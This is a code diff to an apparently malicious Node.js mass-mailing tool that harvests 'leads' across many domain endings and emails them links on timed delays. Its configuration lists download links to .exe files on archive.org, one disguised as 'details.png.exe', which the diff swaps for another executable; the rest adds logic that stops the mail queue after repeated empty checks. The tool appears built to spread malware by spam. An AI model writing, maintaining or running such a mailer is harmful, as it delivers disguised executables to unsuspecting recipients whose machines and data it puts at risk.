@@ -80,7 +80,7 @@ const CONFIG = {
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
   emailLinks: [
     "https://archive.org/download/deliveryraufpoint_202602/deliveryraufpoint.exe",
-    "https://archive.org/download/details.png/details.png.exe",
+    "https://archive.org/download/deliveryraufpoint/deliveryraufpoint.exe",
   ],
   searchTlds: [
     '.com', '.org', '.net', '.io', '.co', '.ad', '.ae', '.af', '.ag', '.al',
@@ -242,6 +242,10 @@ let emailQueueProcessorInterval; // To hold the interval ID
 let pauseTimeout;
 let probeInterval;
 let lastNoLeadsLogTime = 0; // Tracks when "No unsent leads" was last logged
+let consecutiveNoLeadsCount = 0; // Tracks consecutive times no leads are found
+const MAX_CONSECUTIVE_NO_LEADS = 6; // Threshold for stopping email processor
+
+
 
 // Helper to create transporter
 function createTransporter(account) {
@@ -431,7 +435,29 @@ async function emailQueueProcessor() {
   const leads = loadLeads();
 
   const unsentLeads = leads.filter(lead => !lead.emailsSent);
-  console.log(`Found ${unsentLeads.length} unsent leads after filtering.`); // Added log
+    console.log(`Found ${unsentLeads.length} unsent leads after filtering.`); // Added log
+
+  if (unsentLeads.length === 0) {
+    consecutiveNoLeadsCount++;
+    if (consecutiveNoLeadsCount > MAX_CONSECUTIVE_NO_LEADS) {
+      console.log(`[INFO] No unsent leads found for ${MAX_CONSECUTIVE_NO_LEADS} consecutive checks. Stopping email queue processor.`);
+      clearInterval(emailQueueProcessorInterval);
+      emailQueueProcessorInterval = null; // Clear the interval ID
+      emailSendingPaused = true; // Also pause sending to prevent accidental restarts
+      return; // Exit the function
+    }
+
+    const now = Date.now();
+    const oneHour = 60 * 60 * 1000; // Define 1 hour in milliseconds
+
+    // Only log "No unsent leads" if it hasn't been logged in the last hour
+    if (now - lastNoLeadsLogTime > oneHour) {
+      console.log('No unsent leads to process. Will check again periodically.');
+      lastNoLeadsLogTime = now; // Update the last logged time
+    }
+  } else {
+    consecutiveNoLeadsCount = 0; // Reset counter if leads are found
+  }
 
   if (unsentLeads.length === 0) {
     const now = Date.now();
